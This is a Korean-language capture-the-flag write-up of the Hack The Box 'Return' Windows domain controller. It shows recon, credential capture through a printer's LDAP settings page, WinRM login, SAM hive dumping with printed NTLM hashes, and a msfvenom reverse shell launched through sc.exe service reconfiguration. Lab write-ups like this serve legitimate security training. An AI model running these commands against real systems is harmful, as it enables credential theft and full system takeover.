# HTB-RETURN
```bash
OS: Windows(AD)
DATE: 26.09.29
DIFFICULTY: Easy
```

## RECON
**nmap**: 전체 포트 검사와 상세 포트 검사를 진행했다.
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV IP
```
전체 포트 검사를 한 결과 389, 88(Kerberos)와 같은 서비스가 실행 중인 것을 보니 AD DC 서버인 것 같았다. 따라서 445(SMB) 서비스를 먼저 정찰해보았다.
```bash
nxc smb -u '' -p '' --shares
```
등을 확인한 결과 SMB를 익명으로 접속할 수 없었다. 따라서 80(HTTP) 서비스에 접속해보았다. 접속 후 웹 디렉토리와 서브도메인을 열거했다.
```bash
ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://return.local/ -H "Host: FUZZ.return.local" -fs 2827
```
FUZZING 결과 아무런 답도 찾지 못했다.

## Initial Access
fuzzing 결과 아무것도 나오지 않아 기본 페이지를 정찰해보았다. 보니 LDAP 프린터 페이지 같았다. 페이지에 **settings** 페이지가 있었고, 그곳에서 server address, 포트 등을 바꿀 수 있는 기능이 있었다.

![printer](attach_real/Pasted%20image%2020260930144345.png)

따라서 첫 번째 시도는 server address를 내 tun0 IP로 바꿔주고, 포트도 8080 포트로 바꿔준 후 리스닝을 켜준 결과 연결이 실패했다. 따라서 IP만 바꿔주고 쉘에서 **389** 포트에 리스너를 켜주었다.
```bash
nc -nlvp 389
```
하지만 389는 특권 포트이기 때문에 root 권한이 있어야 켜질 수 있었다. 따라서 다시 한 번 시도한 결과 프린터와 연결이 가능했다.
```bash
sudo nc -nlvp 389

connect to [10.10.14.23] from (UNKNOWN) [10.129.95.241] 53765
0*`%return\svc-printer
                       1edFg43012!!
```
따라서 svc-printer라는 유저명과 패스워드처럼 보이는 문자열을 얻게 되었다. 따라서 바로 SMB 접속이 가능한지 확인했다.
```bash
nxc smb IP -u svc_printer -p '1edFg43012!!'
```
접속한 결과 알맞은 유저명이었고, 이번에 WinRM으로 접속이 가능한지 확인했다.
```bash
nxc winrm IP -u svc_printer -p '1edFg43012!!'
```
따라서 WinRM으로 접속한 결과 user 쉘을 얻을 수 있었다.
```bash
evil-winrm -i IP -u svc_printer -p '1edFg43012!!'
```
![user](attach_real/Pasted%20image%2020260930111128.png)

## Privilege Escalation
유저 쉘을 얻고 `whoami /all`을 실행하여 어떤 권한들이 있는지 확인해보았다. 확인한 결과 `SeBackupPrivilege+SeRestorePrivilege` 권한이 있어서, 쉘에서 SAM 파일과 SYSTEM 파일을 로컬로 다운로드받은 후 덤프를 실행했다.
```ps1
reg save hklm\sam C:\temp\sam.hive
```
```ps1
reg save hklm\system C:\temp\system.hive
```
```ps1
download sam.hive
download system.hive
```
이후 로컬에서 덤프를 진행했다.
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL                                                                                                                                                  
Impacket v0.14.0.dev0+20260703.172754.6d62ba59 - Copyright Fortra, LLC and its affiliated companies                                                                                                               
                                                                                                                                                                                                                  
[*] Target system bootKey: 0xa42289f69adb35cd67d02cc84e69c314                                                                                                                                                     
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)                                                                                                                                                              
Administrator:500:aad3b435b51404eeaad3b435b51404ee:34386a771aaca697f447754e4863d38a:::                                                                                                                            
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                    
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                           
[*] Cleaning up...
```
NTLM 해시를 얻었기 때문에 PtH 로그인을 시도한 결과 실패했다. 이유는 로컬로 덤프했기 때문에 도메인 어드민 해시가 아니라 로컬 어드민 해시가 나왔기 때문이다. 따라서 다른 방법으로 시도했다. 다시 한 번 `whoami /all`을 시도한 결과 `SeBackupPrivilege+SeRestorePrivilege` 권한은 권한 상승 방법이 두 가지 있었다. 아까와 같이 덤프를 하면 로컬 어드민 해시가 나와 안 되는 경우가 있지만, sc.exe 방식을 사용하면 코드를 직접 실행하기 때문에 가능했다. 방법은 아래와 같다.
```bash
msfvenom -p windows/shell_reverse_tcp lhost=IP lport=4445 -f exe > shell.exe
```
```ps1
upload /root/HTB/shell.exe
```
이와 같이 Windows 리버스 쉘을 만든 후 upload해주었다. 이후 sc.exe를 사용하여 기존 서비스를 변경하여 다시 시작될 때 쉘을 실행하는 방법이다.
```ps1
sc.exe config VMTools binPath="C:\temp\shell.exe"
```
```ps1
sc.exe stop VMTools
```
```ps1
sc.exe start VMTools
```
이후 리스닝을 켠 결과 SYSTEM 쉘을 얻을 수 있었다.
```bash
rlwrap nc -nlvp 4445
```

![admin](attach_real/Pasted%20image%2020260930121458.png)


## New Inform
- Linux에서 1024 포트 미만은 root 권한이 있어야 바인딩이 가능하다.
- SeBackupPrivilege+SeRestorePrivilege 권한 상승 경로가 여러 가지이다.
- SeBackupPrivilege+SeRestorePrivilege 두 권한은 서로 다른 권한이지만(백업/복원), 둘 다 ACL을 무시한 read/write를 하기 때문에 권한 상승이 가능하다.